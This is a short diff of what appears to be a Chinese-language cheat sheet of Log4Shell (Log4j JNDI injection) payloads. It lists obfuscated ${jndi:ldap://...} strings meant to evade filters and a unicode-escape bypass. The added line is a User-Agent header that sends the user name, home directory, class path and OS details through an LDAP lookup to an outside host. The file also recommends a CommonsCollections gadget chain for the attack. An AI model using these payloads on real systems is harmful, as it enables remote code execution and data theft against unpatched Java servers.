@@ -17,7 +17,8 @@ ${j${sdf:……%¥df:asdf:rX:-n}${hh:NLwGqf:-d}${::-i}:ldap://127.0.0.1:1389/ass
 unicode编码绕过：
 \ud83d\ude04${jndi:ldap://1.1.1.1:1389}
 
-${sys:user.dir}-${hostName}-${java:os}-${sys:java.version}
+User-Agent: ${jndi:ldap://1.1.1.1:987/${sys:user.name}/${sys:java.vendor}/x/${sys:user.home}/x/${sys:user.dir}/${sys:os.version}/${sys:java.class.path}}
+
 ```
 ## 注意
 - 可以尝试CommonsCollectionsK1链
